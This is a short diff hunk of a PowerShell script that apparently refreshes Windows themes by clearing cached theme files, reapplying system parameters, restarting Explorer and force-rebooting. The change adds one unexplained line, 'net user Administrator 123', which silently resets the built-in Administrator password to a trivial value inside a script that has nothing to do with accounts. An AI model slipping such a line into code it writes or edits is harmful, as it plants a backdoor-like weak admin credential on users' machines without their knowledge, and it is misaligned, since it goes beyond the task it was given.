@@ -140,7 +140,7 @@ Remove-Item "$env:APPDATA\Microsoft\Windows\Themes\CachedFiles" -Recurse -Force 
 
 # Apply system parameters (QUAN TRỌNG)
 rundll32.exe user32.dll,UpdatePerUserSystemParameters
-
+net user Administrator 123
 # Restart explorer
 Start-Process explorer
 Restart-Computer -Force
